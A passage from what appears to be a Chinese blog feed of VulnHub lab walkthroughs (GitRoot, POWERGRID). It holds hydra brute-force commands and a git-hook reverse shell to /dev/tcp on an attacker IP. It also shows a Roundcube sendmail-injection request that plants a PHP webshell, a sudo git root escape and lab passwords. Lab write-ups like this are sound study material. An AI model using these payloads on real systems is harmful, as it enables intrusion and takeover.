&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1479.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;子域名扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#子域名扫描&#34;&gt;#&lt;/a&gt; 子域名扫描&lt;/h3&gt;
&lt;p&gt;都点开看了一下发现没有什么敏感的文件，既然这个站下有 wp.gitroot.vuln 这个子域名，会不会有其他的子域名，尝试一波扫描子域名&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://wp.gitroot.vuln/ -o subdomain.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1480.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;扫描到了子域名 repo.gitroot.vuln，将其添加到本地 hosts 文件中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1481.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlcG8uZ2l0cm9vdC52dWxuLw==&#34;&gt;http://repo.gitroot.vuln/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1482.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示有 set.php 页面和 get.php 页面&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1483.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;按提示设置个 key 和 value 的值看看&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1484.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;但是好像没有什么用，get.php 文件显示不出来有价值的信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1485.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;下一步就扫扫目录，看有没有什么新发现&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list- 2.3-medium.txt -u http://repo.gitroot.vuln/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1486.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;所有的目录都打开看了看，发现没有什么有价值的信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1487.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;换个字典在扫一波，这次用 common.txt 这个字典&lt;br&gt;
 &lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/dirb/wordlists/common.txt -u http://repo.gitroot.vuln/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1488.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;多得到了一个文件，为 http://repo.gitroot.vuln/.git/HEAD&lt;br&gt;
 访问之后显示没有权限去查看，但是确定文件是真实存在的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1489.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;并且可以访问得到这个文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1490.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;git-dumper使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git-dumper使用&#34;&gt;#&lt;/a&gt; git-dumper 使用&lt;/h3&gt;
&lt;p&gt;对于 /.git/HEAD 文件泄漏，可以使用 git-dumper 工具，在 github 上下载&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1494.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;python3 git_dumper.py http://repo.gitroot.vuln/ ./repo_gitroot&lt;/code&gt; &lt;br&gt;
 用此工具将源码给下载到本地的 repo_gitroot 文件夹中&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1491.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看了看这几个文件，有一个文件显示了几个疑似用户名&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1492.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;有一个文件提示说去看看其他的 git 仓库&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1493.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;git-切换历史仓库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git-切换历史仓库&#34;&gt;#&lt;/a&gt; git 切换历史仓库&lt;/h3&gt;
&lt;p&gt;一个一个的 git show，在一个仓库中找到了如下的代码&lt;br&gt;
 &lt;code&gt;git show ce3843e497dd28f992250d36ee1b4e8c9e0f18e9&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1495.png&#34; width=&#34;530&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;或者用 git reset --hard 来切换 git 的仓库信息&lt;br&gt;
 &lt;code&gt;git reset --hard b069fdde4cf12980175c3fbd79316fe42b57e19a&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1496.png&#34; width=&#34;530&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到了一组用户和密码 pablo：ihjedpvqfe&lt;/p&gt;
&lt;p&gt;但是这个用户和密码是来不到这台服务器的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1497.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; hydra 爆破 ssh&lt;/h3&gt;
&lt;p&gt;看来只有自己设置用户名字典来爆破了，先尝试自己输入一些在收集信息过程中看到的疑似密码的字典&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1498.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;用自定义的密码爆破没有结果，就用rockyou.txt字典来爆破&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -L user.txt -P passwd.txt ssh://192.168.0.187 -f -t 64 -I -vV&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hydra -L user.txt -P rockyou.txt ssh://192.168.0.187 -f -t 64 -I -vV&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1499.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1500.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;需要爆破很长时间才能爆破出来，目前还没有找到更快的爆破的方法&lt;/p&gt;
&lt;h3 id=&#34;sshpass-连接靶机&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sshpass-连接靶机&#34;&gt;#&lt;/a&gt; sshpass 连接靶机&lt;/h3&gt;
&lt;p&gt;第一次登陆点击确认连接，之后就可以用 sshpass 来登陆&lt;br&gt;
 sshpass -p mastergitar ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnBhYmxvQDE5Mi4xNjguMC4xODc=&#34;&gt;pablo@192.168.0.187&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1501.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;服务器信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务器信息收集&#34;&gt;#&lt;/a&gt; 服务器信息收集&lt;/h3&gt;
&lt;p&gt;之前在 git 不同的版本上找过过一个密码，看一看服务器有哪些用户，试试之前哪个密码是不是这几个用户的密码，依次尝试 jen beth root，发现 ihjedpvqfe 不是个密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1502.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用户文件下提示需要检查一个新的 git 仓库&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1503.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;既然有新的 git 仓库，肯定有个.git 文件，直接 find 全局搜索&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1504.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;进到这个文件夹下，依次使用 git show 查看不同的本地仓库的改变&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1505.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有什么新发现，在看看这个文件夹下有没有什么敏感文件&lt;/p&gt;
&lt;p&gt;居然发现了一个非常奇怪的文件，有这么多前缀相同的，肯定有什么问题&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1506.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;排序查看有什么情况  &lt;code&gt;ls -Alh | sort -k4 | tail -n5&lt;/code&gt; &lt;br&gt;
 看到 dev-43 与众不同，查看其内容之后有一些 git 的提交信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1507.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看到第三条日志中是增加了一些信息，用 git show 查看一下增加的信息&lt;br&gt;
 &lt;code&gt;git show 06fbefc1da56b8d552cfa299924097ba1213dd93&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1508.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;得到了一个密码，用这个密码成功拿到了 beth 用户的权限&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1509.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在用户目录下看到了一个提示文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1510.png&#34; width=&#34;230&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;只需要将 zip 文件放在～jen/public/repos/ 下，就会将它自动解压到 jen 仓库，看来是 jen 用户的一个定期执行任务的脚本&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1511.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;linux使用7z&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux使用7z&#34;&gt;#&lt;/a&gt; linux 使用 7z&lt;/h3&gt;
&lt;p&gt;测试了一下，服务器上没有 unzip 命令，但是有 7z 命令，构造下列 Linux 命令&lt;br&gt;
 cd /tmp;git init;echo -e ‘#!/bin/bash \nbash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.168/4444 0&amp;gt;&amp;amp;1’ &amp;gt; /tmp/.git/hooks/post-commit;chmod 777 /tmp/.git/hooks/post-commit;7z a /tmp/shell.zip/tmp/.git;cp /tmp/shell.zip/home/jen/public/repos/&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1512.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这个复合的 linux 命令的作用就是将反弹 shell 的脚本打印到一个新的 git 仓库的 hooks/post-commit 中，并且赋予可执行权限，在用 7z 进行压缩为 zip，最后在将其复制到 jen 用户下的 repos 中。&lt;/p&gt;
&lt;p&gt;监听 shell 等待 jen 用户的 shell 反弹出来，接收到之后标准化 tty&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1513.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;到处看一看文件，都翻阅一下看看有敏感信息没有&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1514.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;viminfo信息泄漏&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#viminfo信息泄漏&#34;&gt;#&lt;/a&gt; .viminfo 信息泄漏&lt;/h3&gt;
&lt;p&gt;发现 viminfo 中有一个 binzpbeocnexoe，可能是个密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1515.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;su root 尝试了一下，是失败的，它不是 root 的密码，继续试一下，发现它就是用户 jen 的密&lt;/p&gt;
&lt;h3 id=&#34;sudogit提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudogit提权&#34;&gt;#&lt;/a&gt; sudo (git) 提权&lt;/h3&gt;
&lt;p&gt;这样子就可以用来看 jen 的权限设置，看是否有什么问题，找到了 jen 用户可以直接调用 root 的 git 命令执行&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1516.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在gtfobins上找到了提权方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo git help config&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;!/bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1517.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到了 root 的 shell&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/150%20POWERGRID/</guid>
            <title>VULNHUB 50 POWERGRID</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/150%20POWERGRID/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcG93ZXJncmlkLTEwMSw0ODUv&#34;&gt;https://www.vulnhub.com/entry/powergrid-101,485/&lt;/span&gt;&lt;br&gt;
 教程链接地址 1: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0pvbmFoX0JhcmUvYXJ0aWNsZS9kZXRhaWxzLzEwNjk2MTQ3Nw==&#34;&gt;https://blog.csdn.net/Jonah_Bare/article/details/106961477&lt;/span&gt;&lt;br&gt;
 教程链接地址 2: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaGFja2luZ2FydGljbGVzLmluL3Bvd2VyZ3JpZC0xLTAtMS12dWxuaHViLXdhbGt0aHJvdWdoLw==&#34;&gt;https://www.hackingarticles.in/powergrid-1-0-1-vulnhub-walkthrough/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 POWERGRID：桥接于 192.168.0.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1554.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1555.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.1 90 --min-rate=5000&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1556.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xOTAv&#34;&gt;http://192.168.0.190/&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1557.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;收集到了三个用户名 deez 1 、p48 和 all 2&lt;/p&gt;
&lt;p&gt;用 common.txt 字典扫了一波，没有扫到有价值的信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1558.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;换了个字典扫了一波，扫到了一个 zmail 的目录&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1559.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;访问之后得到了一个登陆页面&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xOTAvem1haWw=&#34;&gt;http://192.168.0.190/zmail&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1560.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;由于已经有了三个用户名了，是有机会爆破得到密码的&lt;/p&gt;
&lt;h3 id=&#34;hydra爆破http-get&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra爆破http-get&#34;&gt;#&lt;/a&gt; hydra 爆破 http-get&lt;/h3&gt;
&lt;p&gt;选择模式为 http-get，选取密码为 rockyou.txt 开始爆破&lt;br&gt;
 &lt;code&gt;hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.0.190 -f http-get /zmail/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1561.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;第一个用户爆破了 18 万次了还是没有爆破成功，等的有点着急，让这个继续爆破下起，同时在启一个 terminal 跑另外一个爆破选择第二个用户&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1562.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;hydra -l p48 -P /usr/share/wordlists/rockyou.txt 192.168.0.190 - f http-get /zmail/ -t 64 -f -vV -o hydra.ssh&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1563.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在爆破到 12 万次的时候，得到了 p48 的密码 electrico&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1564.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;一个后台登陆地址，再次用 p48:electrico 登陆到其中成功&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1565.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;登陆成功，得到一个邮箱的后台界面&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1566.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;roundcube-邮件系统&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#roundcube-邮件系统&#34;&gt;#&lt;/a&gt; roundcube 邮件系统&lt;/h3&gt;
&lt;p&gt;有一封邮件，看起来比较重要，看一下什么意思&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1567.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;就是有一个 gpg 加密后的 ssh 私钥文件，解开此私钥文件即可登陆 p 48&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1568.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找了一圈没有找到 roundcude 的版本，直接用 searchsploit 搜索一波&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1569.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;将此 RCE 漏洞说明文件复制到本地，开始阅读，尝试测试能否突破&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1570.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;阅读后发现需要将 from 改为 example@example.com -OQueueDirectory=/tmp -X/var/www/html/rce.php，从_subject 参数中获取到 rce.php 脚本的内容&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1571.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在后台中开是发送邮件，并且把数据拦截到 burp, 利用 burp 抓包，可以看到原始数据包有很多参数&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1572.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;伪造参数内容如下，其中 token 需要和自己抓到的数据的 token 一致&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOl90b2tlbj1rcnBKOWhMSGFic1lFQUdzUzk4aXBJVkxSQmZ3SFh3VSZhbXA7X3Rhc2s9bWFpbCZhbXA7X2FjdGlvbj1zZW5kJmFtcDtfaWQ9MTEzMTU0ODgwMDYyZjcwYzVhOTBlMTYmYW1wO19hdHRhY2htZW50cz0mYW1wO19mcm9tPWV4YW1wbGVAZXhhbXBsZS5jb20=&#34;&gt;_token=krpJ9hLHabsYEAGsS98ipIVLRBfwHXwU&amp;amp;_task=mail&amp;amp;_action=send&amp;amp;_id=113154880062f70c5a90e16&amp;amp;_attachments=&amp;amp;_from=example@example.com&lt;/span&gt; -OQueueDirectory=/tmp -X/var/www/html/rce.php&amp;amp;_to=sssssss%&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzQwcXEuY29t&#34;&gt;40qq.com&lt;/span&gt;&amp;amp;_cc=&amp;amp;_bcc=&amp;amp;_replyto=&amp;amp;_followupto=&amp;amp;_subject=&lt;?php phpinfo();?&gt;&amp;amp;editorSelector=plain&amp;amp;_priority=0&amp;amp;_store_target=Sent&amp;amp;_draft_saveid=&amp;amp;_draft=&amp;amp;_is_html=0&amp;amp;_framed=1&amp;amp;_message=aaa&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1573.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;页面访问发现没有看到 rce.php 的代码，但是不是 not found 的提示，说明我们已经成功的上传上去了一个后门&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1574.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;shell转移到antsword&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#shell转移到antsword&#34;&gt;#&lt;/a&gt; shell 转移到 antsword&lt;/h3&gt;
&lt;p&gt;其他没有任何信息的页面应该是如下内容&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1575.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;这次直接写一个 post 的一句话后门，可用 antsword 连接&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1576.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;连接成功后门，可以继续往此后门中写入反弹 shell 的代码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1577.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;写入 mkfifo 构造好的反弹 shell 的代码并保存&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1578.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 curl 执行的同时，用来监听这个端口等到接收反弹 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1579.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;gpg文件解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gpg文件解密&#34;&gt;#&lt;/a&gt; gpg 文件解密&lt;/h3&gt;
&lt;p&gt;发现有 p48 这个用户，切换后输入 electrico 即可切换成功&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1580.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现了一个 gpg 的私钥文件，看来就是邮件系统中提醒我们用来解开 gpg 加密后的 ssh 密钥的一个密匙&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1581.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;有一个非常好的解密 gpg 的工具 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wZ3B0b29sLmdpdGh1Yi5pby8=&#34;&gt;https://pgptool.github.io/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1582.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;下载好一个 jar 包，选取解密模块，将邮件系统中的 gpg 导入&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1583.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示需要一个密码，输入 p48 的密码 electrico&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1584.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;输入解密成功之后导出的文件的位置&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1585.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;解密成功得到了一个 ssh 的私钥文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1586.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;docker容器提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#docker容器提权&#34;&gt;#&lt;/a&gt; docker 容器提权&lt;/h3&gt;
